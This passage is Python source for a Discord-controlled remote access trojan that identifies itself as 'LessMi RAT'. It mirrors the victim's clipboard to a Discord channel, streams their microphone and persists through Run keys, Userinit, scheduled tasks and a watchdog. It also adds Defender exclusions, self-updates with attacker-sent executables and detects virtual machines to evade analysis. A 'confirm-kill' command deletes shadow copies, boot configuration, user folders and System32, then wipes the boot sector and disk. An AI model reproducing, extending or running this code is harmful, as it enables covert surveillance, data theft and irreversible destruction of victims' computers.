       "[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int u,string p,int f);}'; "
       "[W]::SystemParametersInfo(20,0,'" + path + "',3)")
    await ctx.send(embed=create_embed("🖼️ Wallpaper", "The current screen was captured and set as the wallpaper.", 0x0084ff))

@bot.command(aliases=["toico", "img2ico"])
async def img_to_ico(ctx, *, file: str):
    p = resolve(file)
    try:
        from PIL import Image
        out = p.rsplit(".", 1)[0] + ".ico"
        Image.open(p).convert("RGBA").save(
            out, format="ICO", sizes=[(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)])
        await ctx.send(embed=create_embed("🖼️ ICO", "The image was converted to a multi size icon and is attached below."), file=discord.File(out))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The conversion failed: {}".format(e), 0xff0000))

@bot.command(aliases=["img-filter", "filter-img"])
async def image_filter(ctx, effect: str = None, *, file: str = None):
    fx = ("blur", "sharpen", "edges", "emboss", "gray", "invert", "poster", "solar")
    if not effect or not file:
        await ctx.send(embed=create_embed("Filters", "Available filters are " + ", ".join(fx) + ".", 0))
        return
    if effect not in fx:
        await ctx.send(embed=create_embed("Filters", "Available filters are " + ", ".join(fx) + ".", 0))
        return
    p = resolve(file)
    try:
        from PIL import Image, ImageFilter, ImageOps
        img = Image.open(p).convert("RGB")
        ops = {
            "blur": lambda i: i.filter(ImageFilter.GaussianBlur(6)),
            "sharpen": lambda i: i.filter(ImageFilter.SHARPEN),
            "edges": lambda i: i.filter(ImageFilter.FIND_EDGES),
            "emboss": lambda i: i.filter(ImageFilter.EMBOSS),
            "gray": lambda i: ImageOps.grayscale(i),
            "invert": lambda i: ImageOps.invert(i),
            "poster": lambda i: ImageOps.posterize(i, 3),
            "solar": lambda i: ImageOps.solarize(i, 100),
        }
        out = p.rsplit(".", 1)[0] + "_" + effect + ".png"
        ops[effect](img).save(out)
        await ctx.send(embed=create_embed("🖼️ Filter", "The **{}** filter was applied and the result is attached below.".format(effect)), file=discord.File(out))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The filter could not be applied: {}".format(e), 0xff0000))

@bot.command(aliases=["cloak"])
async def hide_folder(ctx, *, path: str):
    p = resolve(path)
    _hide(p, True)
    await ctx.send(embed=create_embed("🫥 Hidden", "`{}` now has the hidden and system attributes set.".format(p), 0x00ff00))

@bot.command(aliases=["deny-folder", "lock-folder"])
async def lock_folder(ctx, *, path: str):
    p = resolve(path)
    subprocess.run(["icacls", p, "/deny", "*S-1-5-32-545:(OI)(CI)(DE,DC)"],
                   capture_output=True, creationflags=_CNW)
    await ctx.send(embed=create_embed("🔒 Folder", "Users can no longer delete anything inside `{}`.".format(p), 0xff0000))

@bot.command(aliases=["allow-folder", "unlock-folder"])
async def unlock_folder(ctx, *, path: str):
    p = resolve(path)
    subprocess.run(["icacls", p, "/remove:d", "*S-1-5-32-545"],
                   capture_output=True, creationflags=_CNW)
    await ctx.send(embed=create_embed("🔓 Folder", "The delete lock was removed from `{}`.".format(p), 0x00ff00))

@bot.command(aliases=["run-add", "startup-add"])
async def startup_add(ctx, name: str, *, target: str):
    _reg_add(RUN_KEY, name, resolve(target), hive="HKCU")
    await ctx.send(embed=create_embed("🚀 Run", "`{}` will run `{}` every time the user signs in.".format(name, target), 0x00ff00))

@bot.command(aliases=["run-del", "startup-del"])
async def startup_del(ctx, name: str):
    _reg_delete(RUN_KEY, name, "HKCU")
    await ctx.send(embed=create_embed("🚀 Run", "`{}` was removed from the user startup entries.".format(name), 0xff0000))

@bot.command(aliases=["load", "perf"])
async def performance(ctx):
    cpu = psutil.cpu_percent(interval=0.7)
    ram = psutil.virtual_memory()
    e = create_embed("📈 Load", "Current resource usage of the machine.", 0x3498db)
    e.add_field(name="CPU", value=f"{cpu}%", inline=True)
    e.add_field(name="RAM", value=f"{ram.percent}%", inline=True)
    e.add_field(name="Procs", value=str(len(psutil.pids())), inline=True)
    await ctx.send(embed=e)

@bot.command(aliases=["pstree", "ps-tree"])
async def process_tree(ctx):
    rows = []
    for p in psutil.process_iter(["pid", "name", "ppid"]):
        try:
            rows.append((p.info.get("ppid") or 0, p.info["pid"], p.info.get("name") or "?"))
        except Exception:
            pass
    kids = {}
    for ppid, pid, name in rows:
        kids.setdefault(ppid, []).append((pid, name))

    def walk(ppid, depth):
        out = []
        for pid, name in kids.get(ppid, [])[:6]:
            out.append("  " * depth + f"{name} [{pid}]")
            if depth < 2:
                out.extend(walk(pid, depth + 1))
        return out

    await send_long(ctx, "\n".join(walk(0, 0))[:6000] or "The process tree is empty.")

@bot.command(aliases=["foreground", "fgwin", "win-top"])
async def win_top(ctx):
    hwnd = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(hwnd)
    pid = ctypes.c_ulong()
    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    try:
        name = psutil.Process(pid.value).name()
    except Exception:
        name = "unknown"
    await ctx.send(embed=create_embed("🪟 Foreground", "The window in the foreground belongs to the process below.\n```{} [{}]\n{}```".format(name, pid.value, title[:120]), 0x3498db))

@bot.command(aliases=["clipwatch", "clip-watch"])
async def clipboard_watch(ctx, state: str = "on"):
    global clip_watch
    clip_watch = state != "off"
    if not clip_watch:
        await ctx.send(embed=create_embed("📋 Clipboard", "The clipboard watcher was stopped.", 0xff0000))
        return

    def loop():
        last = None
        while clip_watch:
            try:
                win32clipboard.OpenClipboard()
                try:
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                finally:
                    win32clipboard.CloseClipboard()
                if data and data != last:
                    last = data
                    asyncio.run_coroutine_threadsafe(
                        send_keylog_to_discord("[clip] " + data[:1500]), bot.loop)
            except Exception:
                pass
            time.sleep(1.5)

    threading.Thread(target=loop, daemon=True).start()
    await ctx.send(embed=create_embed("📋 Clipboard", "Every change of the clipboard will be mirrored into the keys channel.", 0x00ff00))

@bot.command(aliases=["boot-info", "boot-cfg"])
async def boot_info(ctx):
    b = datetime.fromtimestamp(psutil.boot_time())
    await ctx.send(embed=create_embed("⏱️ Boot", "The machine booted at `{}` and has been up for `{}`.".format(b.strftime("%Y-%m-%d %H:%M:%S"), str(datetime.now() - b).split(".")[0]), 0x3498db))

@bot.command(aliases=["delay-off", "sched-shutdown"])
async def sched_shutdown(ctx, seconds: int = 60):
    subprocess.run(["shutdown", "/s", "/f", "/t", str(max(5, min(seconds, 86400)))],
                   capture_output=True, creationflags=_CNW)
    await ctx.send(embed=create_embed("⏻ Shutdown", "The machine will shut down in **{}** seconds, `.cancel` stops it.".format(seconds), 0xff0000))

@bot.command()
async def matrix(ctx):
    threading.Thread(target=flash_screen, args=("matrix_rain",), daemon=True).start()
    await ctx.send(embed=create_embed("🟩 Matrix", "The green matrix rain is falling over the desktop.", 0x00ff00))

@bot.command(aliases=["wdiag", "persist"])
async def watchdog_status(ctx):
    st = _state_read() or {}
    lines = []
    for s in (st.get("slots") or []):
        p = s.get("exe")
        b = s.get("bat")
        lines.append("{} exe={} bat={}".format(
            "OK  " if p and os.path.exists(p) else "MISS",
            p, "yes" if b and os.path.exists(b) else "no"))
    ui = (_reg_query(WINLOGON_KEY, "Userinit") or "").lower()
    lines.append("userinit: " + ("ok" if st.get("exe") and st["exe"].lower() in ui else "MISSING"))
    for t in (st.get("tasks") or []):
        lines.append("{}: {}".format(t, "ok" if _task_exists(t) else "MISSING"))
    alive = _watch_proc is not None and _watch_proc.poll() is None
    lines.append("watchdog: " + ("pid {}".format(_watch_proc.pid) if alive else "DOWN"))
    await send_long(ctx, "\n".join(lines))

@bot.command(aliases=["vmdiag", "vmcheck", "vmping"])
async def vm_diag(ctx):
    strong, weak = vm_hits()
    kill = len(strong) >= VM_STRONG_MIN or len(weak) >= VM_SCORE_MIN
    e = create_embed("🧪 VM guard", "The verdict is **{}**, based on the hits below.".format("EXIT" if kill else "RUN"),
                     0xFF0000 if kill else 0x00FF00)
    e.add_field(name="strong ({}/{})".format(len(strong), VM_STRONG_MIN),
                value="```{}```".format("\n".join(strong) or "-"), inline=False)
    e.add_field(name="weak ({}/{})".format(len(weak), VM_SCORE_MIN),
                value="```{}```".format("\n".join(weak) or "-"), inline=False)
    await ctx.send(embed=e)

@bot.command(aliases=["crashlog", "clog", "crash"])
async def crash_log(ctx):
    if not os.path.exists(CRASH_FILE):
        await ctx.send(embed=create_embed("🧯 Crash log", "There is no crash log at `{}`.".format(CRASH_FILE), 0x3498DB))
        return
    size = os.path.getsize(CRASH_FILE)
    await ctx.send(embed=create_embed("🧯 Crash log", "The log is `{}` bytes long and is attached below.".format(size), 0x3498DB),
                   file=discord.File(CRASH_FILE, filename="crash.log"))

@bot.command(aliases=["crashclear", "clearcrash"])
async def crash_clear(ctx):
    for p in (CRASH_FILE, os.path.join(CRASH_DIR, "fault.log")):
        try:
            os.remove(p)
        except Exception:
            pass
    await ctx.send(embed=create_embed("🧯 Crash log", "The crash log and the fault log were deleted.", 0x00FF00))

@bot.command(aliases=["fbsod", "fake-bsod"])
async def fake_bsod(ctx):
    def run():
        r = tkinter.Tk()
        r.configure(bg="#0078d7")
        r.attributes("-fullscreen", True, "-topmost", True)
        tkinter.Label(r, text=":(", bg="#0078d7", fg="white", font=("Segoe UI", 90)).pack(pady=(140, 20))
        tkinter.Label(r, text="Your PC ran into a problem and needs to restart.\n"
                              "We're just collecting some error info, and then we'll restart for you.",
                      bg="#0078d7", fg="white", font=("Segoe UI", 20)).pack()
        tkinter.Label(r, text="0% complete", bg="#0078d7", fg="white", font=("Segoe UI", 14)).pack(pady=30)
        r.after(12000, r.destroy)
        r.mainloop()
    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("💀 Fake BSOD", "A fake blue screen was shown fullscreen for twelve seconds.", 0xff0000))

@bot.command(aliases=["flock", "fake-lock"])
async def fake_lock(ctx):
    def run():
        r = tkinter.Tk()
        r.configure(bg="#101418")
        r.attributes("-fullscreen", True, "-topmost", True)
        tkinter.Label(r, text=datetime.now().strftime("%H:%M"), bg="#101418", fg="white",
                      font=("Segoe UI Light", 96)).pack(pady=(160, 0))
        tkinter.Label(r, text=(os.environ.get("USERNAME") or "").title(), bg="#101418",
                      fg="#dddddd", font=("Segoe UI", 26)).pack(pady=40)
        tkinter.Label(r, text="Click to unlock", bg="#101418", fg="#888888",
                      font=("Segoe UI", 13)).pack()
        r.after(10000, r.destroy)
        r.mainloop()
    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("🔐 Fake Lock", "A fake lock screen with the current time and user was shown for ten seconds.", 0x0084ff))

@bot.command(aliases=["bscreen", "black-screen"])
async def black_screen(ctx, seconds: int = 10):
    def run():
        r = tkinter.Tk()
        r.configure(bg="black")
        r.attributes("-fullscreen", True, "-topmost", True)
        r.after(max(1, min(seconds, 600)) * 1000, r.destroy)
        r.mainloop()
    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("⬛ Black Screen", "The screen was covered with black for **{}** seconds.".format(seconds), 0xff0000))

@bot.command(aliases=["capsroulette", "caps-roulette"])
async def caps_roulette(ctx, seconds: int = 30):
    def run():
        end = time.time() + max(5, min(seconds, 300))
        while time.time() < end:
            _set_lock("capslock", random.random() > 0.5)
            time.sleep(random.uniform(0.4, 1.8))
    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("⌨️ Caps Roulette", "Caps Lock will flip randomly for **{}** seconds.".format(seconds), 0xf39c12))

@bot.command(aliases=["vroulette", "volume-roulette"])
async def volume_roulette(ctx, seconds: int = 20):
    def run():
        end = time.time() + max(5, min(seconds, 300))
        while time.time() < end:
            set_volume_level(random.choice([0.0, 0.25, 0.6, 1.0]))
            time.sleep(0.8)
    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("🔊 Volume Roulette", "The volume will jump between random levels for **{}** seconds.".format(seconds), 0xf39c12))

@bot.command(aliases=["numspam", "numlock-spam"])
async def numlock_spam(ctx, times: int = 20):
    for _ in range(max(2, min(times, 200))):
        _set_lock("numlock", True)
        time.sleep(0.08)
        _set_lock("numlock", False)
        time.sleep(0.08)
    await ctx.send(embed=create_embed("🔢 Num Spam", "Num Lock was flipped **{}** times in a row.".format(times), 0xf39c12))

@bot.command(aliases=["wshake", "window-shake"])
async def window_shake(ctx, times: int = 20):
    def run():
        hwnd = win32gui.GetForegroundWindow()
        rect = win32gui.GetWindowRect(hwnd)
        x, y = rect[0], rect[1]
        for i in range(max(2, min(times, 200))):
            d = 18 if i % 2 else -18
            win32gui.SetWindowPos(hwnd, 0, x + d, y + d // 2, 0, 0, 0x0001 | 0x0004)
            time.sleep(0.04)
        win32gui.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001 | 0x0004)
    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("🪟 Shake", "The foreground window was shaken **{}** times.".format(times), 0xf39c12))

@bot.command(aliases=["mess", "desktop-mess"])
async def desktop_mess(ctx, count: int = 60):
    d = os.path.join(os.path.expanduser("~"), "Desktop")
    n = max(1, min(count, 500))
    for i in range(n):
        try:
            with builtins.open(os.path.join(d, f"{_rand(6)}_{i}.txt"), "w") as f:
                f.write(_rand(24))
        except Exception:
            pass
    await ctx.send(embed=create_embed("🗂️ Desktop", "**{}** junk text files were dropped on the desktop.".format(n), 0xf39c12))

@bot.command(aliases=["hold", "mouse-hold"])
async def mouse_hold(ctx, seconds: int = 5):
    def run():
        win32api.mouse_event(0x0002, 0, 0, 0, 0)
        time.sleep(max(1, min(seconds, 120)))
        win32api.mouse_event(0x0004, 0, 0, 0, 0)
    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("🖱️ Hold", "The left mouse button is held down for **{}** seconds.".format(seconds), 0xf39c12))

@bot.command(aliases=["errstorm", "error-storm"])
async def error_storm(ctx, count: int = 5):
    n = max(1, min(count, 30))

    def run():
        for _ in range(n):
            subprocess.Popen(
                ["powershell", "-NoProfile", "-Command",
                 "Add-Type -AssemblyName Microsoft.VisualBasic;"
                 "[Microsoft.VisualBasic.Interaction]::MsgBox('Critical error 0x{:04X}','OKOnly','System')".format(
                     random.randint(0, 65535))],
                creationflags=_CNW)
            time.sleep(0.15)

    threading.Thread(target=run, daemon=True).start()
    await ctx.send(embed=create_embed("⚠️ Error Storm", "**{}** error dialogs were stacked on the screen.".format(n), 0xff0000))

@bot.command(aliases=["rickroll"])
async def rick_roll(ctx):
    subprocess.Popen(["start", "https://www.youtube.com/watch?v=xvFZjo5PgG0"], shell=True)
    await ctx.send(embed=create_embed("🎵 Rickroll", "The browser was opened on the classic video.", 0x00ff00))

@bot.command(aliases=["tbar", "taskbar-dance"])
async def taskbar_dance(ctx, times: int = 10):
    hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
    for i in range(max(2, min(times, 100))):
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE if i % 2 == 0 else win32con.SW_SHOW)
        time.sleep(0.25)
    await ctx.send(embed=create_embed("🪟 Taskbar", "The taskbar was hidden and shown **{}** times.".format(times), 0xf39c12))

@bot.command(aliases=["confirm-kill"])
async def confirm_kill(ctx):
    await ctx.send("`💻` The system is being destroyed. If this is the last message the bot sends, the machine is gone for good.")

    async def step(msg):
        await ctx.send(f"`»` {msg}")

    await step("Purging the security software")
    try:
        await asyncio.to_thread(purge_av)
    except Exception:
        pass

    await step("Killing the recovery environment")
    def kill_recovery():
        for args in (
            ["reagentc", "/disable"],
            ["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
            ["bcdedit", "/deletevalue", "{default}", "recoverysequence"],
            ["bcdedit", "/delete", "{current}", "/f"],
            ["vssadmin", "delete", "shadows", "/all", "/quiet"],
            ["wbadmin", "delete", "systemstatebackup", "-quiet"],
            ["powercfg", "/hibernate", "off"],
        ):
            try:
                subprocess.run(args, capture_output=True, creationflags=_CNW)
            except Exception:
                pass
    await asyncio.to_thread(kill_recovery)

    await step("Deleting the boot configuration store")
    for bcd in (r"C:\Boot\BCD", r"C:\EFI\Microsoft\Boot\BCD"):
        try:
            subprocess.run(["attrib", "-h", "-s", "-r", bcd], capture_output=True, creationflags=_CNW)
            os.remove(bcd)
        except Exception:
            pass

    await step("Deleting the user data")
    for folder in ("Downloads", "Desktop", "Documents", "Music", "Pictures",
                   "Videos", r"AppData\Local\Temp"):
        p = os.path.join(os.path.expanduser("~"), folder)
        if os.path.isdir(p):
            subprocess.run(f'rd /s /q "{p}"', shell=True, capture_output=True, creationflags=_CNW)

    await step("Deleting System32")
    subprocess.run(["icacls", os.path.join(WINDIR, "System32"),
                    "/grant", "*S-1-5-32-545:F", "/t", "/c", "/q"],
                   capture_output=True, creationflags=_CNW)
    for d in ("System32", "SysWOW64"):
        await asyncio.to_thread(lambda d=d: subprocess.run(
            f'rd /s /q "{os.path.join(WINDIR, d)}"', shell=True,
            capture_output=True, creationflags=_CNW))

    await step("Wiping the boot sector and the partition table")
    subprocess.run(["bootsect", "/nt60", "SYS", "/force", "/mbr"],
                   capture_output=True, creationflags=_CNW)
    subprocess.run(["bootsect", "/nt60", "ALL", "/force", "/mbr"],
                   capture_output=True, creationflags=_CNW)

    try:
        r = _ps("(Get-Disk | Where-Object { $_.IsBoot }).Number")
        out = (r.stdout or "").strip().splitlines() if r else []
        num = out[0].strip() if out and out[0].strip().isdigit() else "0"
        script = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "zz.txt")
        with open(script, "w") as f:
            f.write(f"select disk {num}\nclean\n")
        subprocess.run(["diskpart", "/s", script], capture_output=True, creationflags=_CNW)
    except Exception:
        pass

    await step("Rebooting in three seconds")
    subprocess.Popen(["shutdown", "/r", "/f", "/t", "3"], shell=True)

@bot.command()
async def exit(ctx):
    await ctx.send(embed=create_embed("👋 Goodbye", "The watchdog is being suspended and the process is closing, nothing will bring it back until the next logon.", 0x00ff00))
    if not await asyncio.to_thread(_watch_suspend):
        await ctx.send(embed=create_embed("Error", "The watchdog would not die, but the process is closing anyway.", 0xffa500))
    try:
        await asyncio.wait_for(bot.close(), 5)
    except Exception:
        pass
    os._exit(0)


@bot.command()
async def update(ctx):
    if not ctx.message.attachments:
        await ctx.send(":exclamation: You have to attach the new executable to the same message as the command.")
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith(".exe"):
        await ctx.send(":exclamation: The attachment has to be an executable ending in `.exe`.")
        return

    st = _ensure_state()
    target = Path(st["exe"])
    bak = Path(st["bak"])

    for f in glob.glob(os.path.join(BASE_DIR, "update_*.exe")):
        try:
            os.remove(f)
        except Exception:
            pass

    new_path = os.path.join(BASE_DIR, "update_{}.exe".format(int(time.time())))
    try:
        await attachment.save(new_path)
        size = os.path.getsize(new_path)
        with open(new_path, "rb") as f:
            magic = f.read(2)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The binary could not be saved: {}".format(e), 0xFF0000))
        return

    if size < 100_000 or magic != b"MZ":
        try:
            os.remove(new_path)
        except Exception:
            pass
        await ctx.send(embed=create_embed("Error", "The file is not a valid executable, the update was aborted.", 0xFF0000))
        return

    await ctx.send(embed=create_embed("📲 Updating", "The watchdog is being suspended before the swap.", 0x00FF00))
    if not await asyncio.to_thread(_watch_suspend):
        await ctx.send(embed=create_embed("Error", "The watchdog refused to die, the update was aborted.", 0xFF0000))
        await asyncio.to_thread(_watch_resume)
        return

    def swap():
        old = str(target) + ".old"
        try:
            if os.path.exists(old):
                subprocess.run(["attrib", "-r", "-s", "-h", old], capture_output=True,
                               creationflags=_CNW)
                os.remove(old)
        except Exception:
            pass
        if target.exists():
            os.rename(str(target), old)
        shutil.copy2(new_path, str(target))
        if not target.exists() or target.stat().st_size != size:
            raise OSError("the swap did not verify")
        _hide(str(target), True)
        _lock_exe(target)
        try:
            os.makedirs(str(bak.parent), exist_ok=True)
            shutil.copy2(new_path, str(bak))
            _hide(str(bak), True)
        except Exception:
            pass
        _ps(f'Add-MpPreference -ExclusionPath "{target}" -ErrorAction SilentlyContinue')

    try:
        await asyncio.to_thread(swap)
    except Exception as e:
        _crash("update", "swap failed {!r}".format(e))
        try:
            if os.path.exists(str(target) + ".old") and not target.exists():
                os.rename(str(target) + ".old", str(target))
        except Exception:
            pass
        await ctx.send(embed=create_embed("Error", "The swap failed and the old binary was restored: {}".format(e), 0xFF0000))
        await asyncio.to_thread(_watch_resume)
        return

    _crash("update", "swapped target={} size={}".format(target, size))
    _mutex_release()
    try:
        r = ctypes.windll.shell32.ShellExecuteW(
            None, "open", str(target), None, str(target.parent), 1)
        if int(r) <= 32:
            raise OSError("ShellExecute returned {}".format(r))
    except Exception as e:
        _mutex_claim()
        await ctx.send(embed=create_embed("Error", "The new binary is in place but could not be launched: {}".format(e), 0xFF0000))
        await asyncio.to_thread(_watch_resume)
        return

    await asyncio.sleep(2)
    os._exit(0)

@bot.command(aliases=["set-date"])
async def set_date(ctx, date_str: str):
    ps(f'Set-Date -Date "{date_str}"')
    await ctx.send(embed=create_embed("📅 Date", "The system date was set to `{}`.".format(date_str), 0x00ff00))


@bot.command(aliases=["set-time", "set-hour"])
async def set_time(ctx, time_str: str):
    ps(f'Set-Date -Date "{time_str}"')
    await ctx.send(embed=create_embed("⌛ Time", "The system clock was set to `{}`.".format(time_str), 0x00ff00))


@bot.command(aliases=["uac-bypass"])
async def uac_bypass(ctx):
    await ctx.send("`🧮` A UAC bypass is being attempted.")
    subprocess.run(["powershell", "-Command", "Start-Process powershell -Verb runAs"], capture_output=True)
    await ctx.send(embed=create_embed("🧮 UAC", "The elevation was requested and the consent prompt should be on the screen.", 0x00ff00))


@bot.command(aliases=["ask-admin"])
async def ask_admin(ctx):
    if is_admin():
        await ctx.send("`👔` The process is already elevated, nothing to do.")
        return
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    await ctx.send(embed=create_embed("👔 Admin", "A new elevated instance was requested through the UAC prompt.", 0x00ff00))


async def post_info_channel(guild):
    info_ch = guild.get_channel(cfg_get(guild.id, "info"))
    if not info_ch:
        return
    try:
        await info_ch.purge(limit=100)
    except Exception:
        pass

    pc = socket.gethostname()
    await info_ch.send(embed=create_embed("ℹ️ System Information", "The machine that just connected is called **{}**.".format(pc), 0x3498DB))
    raw = await asyncio.to_thread(exec_capture, "systeminfo")
    await _send_text_files(info_ch, "systeminfo_{}".format(pc), raw)
    await info_ch.send(embed=create_embed("Grab", "The grabber is not run on boot, use `.grab all` whenever you want the data.", 0x00FF00))

@bot.command()
async def join(ctx):
    global voice_client, _voice_gen
    if not ctx.author.voice:
        await ctx.send(embed=create_embed("Error", "You have to be inside a voice channel first.", 0xFF0000))
        return
    if voice_client and voice_client.is_connected():
        await voice_client.move_to(ctx.author.voice.channel)
    else:
        voice_client = await ctx.author.voice.channel.connect()
    _voice_gen += 1
    threading.Thread(target=_voice_watchdog, args=(_voice_gen,), daemon=True).start()
    await ctx.send(embed=create_embed("Voice", "The microphone is being streamed into `{}` and will restart by itself if it drops.".format(ctx.author.voice.channel.name), 0x00FF00))


@bot.command()
async def disconnect(ctx):
    global voice_reconnect
    voice_reconnect = False
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
    await ctx.send(embed=create_embed("Voice", "The microphone stream was stopped and the bot left the channel.", 0x00FF00))

async def _setup_guild(guild, category_name, pc_name):
    gid = guild.id
    CHANNEL_IDS.setdefault(gid, {})

    for ch in list(guild.text_channels):
        if ch.name in ("panel", "lessmi-panel", "lessmi_panel", "🧮〡panel"):
            try:
                await ch.delete(reason="Panel moved to the web UI")
            except Exception:
                pass

    stored_accent = get_guild_value(gid, "accent")
    if stored_accent:
        globals()["ACCENT"] = stored_accent

    for ch in list(guild.text_channels):
        if ch.name in ("panel", "lessmi-panel", "lessmi_panel"):
            try:
                await ch.delete(reason="Panel moved to the web UI")
            except Exception:
                pass

    cat_id = get_guild_value(gid, "category")
    cat = guild.get_channel(cat_id) if cat_id else None
    if not cat:
        cat = discord.utils.get(guild.categories, name=category_name)
        if not cat:
            cat = await guild.create_category(category_name)
    CATEGORY_IDS[gid] = cat.id
    set_guild_value(gid, "category", cat.id)

    for key, name in CHANNEL_NAMES.items():
        if key == "info":
            old_id = get_guild_value(gid, key)
            old = guild.get_channel(old_id) if old_id else None
            if not old:
                old = discord.utils.get(cat.text_channels, name=name)
            if old:
                try:
                    await old.delete()
                except Exception:
                    pass
            ch = await guild.create_text_channel(name, category=cat)
        else:
            ch_id = get_guild_value(gid, key)
            ch = guild.get_channel(ch_id) if ch_id else None
            if not ch:
                ch = discord.utils.get(cat.text_channels, name=name)
                if not ch:
                    ch = await guild.create_text_channel(name, category=cat)
        CHANNEL_IDS[gid][key] = ch.id
        set_guild_value(gid, key, ch.id)

    for idx, key in enumerate(CHANNEL_ORDER):
        ch = guild.get_channel(CHANNEL_IDS[gid].get(key))
        if ch:
            try:
                await ch.edit(position=idx)
            except Exception:
                pass

    voice_ch = discord.utils.get(cat.voice_channels, name="Live microphone")
    if not voice_ch:
        try:
            voice_ch = await guild.create_voice_channel("Live microphone", category=cat)
        except Exception:
            pass

    if voice_ch:
        CHANNEL_IDS[gid]["livemic"] = voice_ch.id
        set_guild_value(gid, "livemic", voice_ch.id)
        try:
            await voice_ch.edit(position=len(CHANNEL_ORDER))
        except Exception:
            pass

    keys_ch = guild.get_channel(cfg_get(gid, "keys"))
    if keys_ch:
        timestamp = datetime.now().strftime("[%Y-%m-%d] [%H:%M:%S]")
        await keys_ch.send(f"`{timestamp}` - **Started** new **session** on `{pc_name}`")

    panel_ch = guild.get_channel(cfg_get(gid, "panel"))
    if panel_ch:
        try:
            await panel_ch.purge(limit=100)
        except Exception:
            pass

        def mk(title, desc, color, fields):
            e = create_embed(title, desc, color)
            for n, v in fields:
                e.add_field(name=n, value=v, inline=True)
            return e

        panels = [
            ("Screenshot & Recording", "Screen and camera control", 0x3498db,
             [(".ss", "Screenshot"), (".screenrec", "Record"), (".webcam", "Webcam")], ButtonsScreenshot),
            ("System Control", "Volume, input, monitors", 0xe74c3c,
             [(".volume", "Volume"), (".block-input", "Block"), (".monitors", "Monitors")], ButtonsSystem),
            ("Cameras & Audio", "Device management", 0x2ecc71,
             [(".list-cams", "Cams"), (".list-mics", "Mics"), (".join", "Join")], ButtonsCameras),
            ("Processes", "Process management", 0x9b59b6,
             [(".tasklist", "List"), (".kill-explorer", "Kill Exp"), (".start-explorer", "Start Exp")], ButtonsProcesses),
            ("Trolling", "Fun commands", 0xf39c12,
             [(".fake-bsod", "Fake BSOD"), (".crazy-mouse", "Crazy"), (".bsod", "BSOD"), (".forkbomb", "Fork")], ButtonsTrolling),
            ("Files", "File management", 0x1abc9c,
             [(".ls", "List"), (".tree", "Tree")], ButtonsFiles),
            ("Security", "Blacklist", 0x95a5a6,
             [(".blacklist", "Block"), (".unblacklist", "Unblock")], ButtonsSecurity),
            ("Power", "Session control", 0xe67e22,
             [(".lock-pc", "Lock"), (".sleep-pc", "Sleep"), (".restart-pc", "Restart"), (".shutdown-pc", "Shutdown")], ButtonsPower),
            ("Info", "System information", 0x3498db,
             [(".sysinfo", "Sysinfo"), (".battery", "Battery"), (".wifi", "WiFi"), (".drives", "Drives")], ButtonsInfo),
            ("Tools", "Grabber, accent, clicks", 0x2ecc71,
             [(".grabber", "Grabber"), (".accent", "Accent"), (".click", "Click")], ButtonsTools),
            ("More", "Extra tools", 0x9b59b6,
             [(".wdiag", "Persist"), (".clipwatch", "Clip Watch"), (".pstree", "Proc Tree"), (".notepad", "Notepad"), (".beep", "Beep")], ButtonsMore),
        ]
        for title, desc, color, fields, view in panels:
            try:
                await panel_ch.send(embed=mk(title, desc, color, fields), view=view())
            except Exception:
                _crash("ready", "panel {} failed\n{}".format(title, traceback.format_exc()))


@bot.command(aliases=["web", "webui", "web-panel"])
async def panel(ctx, action: str = None, value: str = None):
    action = (action or "lan").lower()
    if action == "stop":
        await web_stop()
        await ctx.send(embed=create_embed("🌐 Panel", "Stopped and the capture handle was released.", 0xFF0000))
        return
    if action == "tunnel":
        await ctx.send(embed=create_embed("🌐 Panel", await web_tunnel_start(), 0x00FF00))
        return
    if action not in ("lan", "url", "start"):
        await ctx.send(embed=create_embed("🌐 Panel", "`lan` `url` `start` `tunnel` `stop`", 0x00FF00))
        return

    want = "127.0.0.1" if action == "start" else "0.0.0.0"
    if WEB_RUNNER and WEB_HOST != want:
        await web_stop()
    if not WEB_RUNNER:
        await web_start(want)

    if action == "start":
        await ctx.send(embed=create_embed("🌐 Panel (local)", WEB_URL, 0x00FF00))
        return
    ips = _lan_ips()
    if not ips:
        await ctx.send(embed=create_embed("🌐 Panel", "No LAN address found, local only:\n" + WEB_URL, 0xFFA500))
        return
    body = "\n".join("http://{}:{}/?t={}".format(i, WEB_PORT, WEB_TOKEN) for i in ips)
    await ctx.send(embed=create_embed("🌐 Panel (LAN)", body[:1900], 0x00FF00))

@bot.event
async def on_ready():
    global _THREADS_ON
    print(f"Connected as {bot.user}")
    _crash("ready", "connected as {}".format(bot.user))

    pc_name = socket.gethostname()
    category_name = f"💻 〣 {pc_name}"

    try:
        await bot.change_presence(
            status=discord.Status.dnd,
            activity=discord.Activity(type=discord.ActivityType.playing, name="🔑 LessMi RAT")
        )
    except Exception:
        _crash("ready", "presence failed\n{}".format(traceback.format_exc()))

    try:
        await _prime_footer_icon()
    except Exception:
        _crash("ready", "footer icon failed\n{}".format(traceback.format_exc()))

    for guild in bot.guilds:
        try:
            info_ch = guild.get_channel(cfg_get(guild.id, "info"))
            if info_ch:
                await info_ch.send(embed=create_embed(
                    "Online",
                    f"**{pc_name}** · `{os.environ.get('USERNAME')}@{pc_name}`\nWeb panel: `.panel`",
                    0x2ECC71))
        except Exception:
            pass
        try:
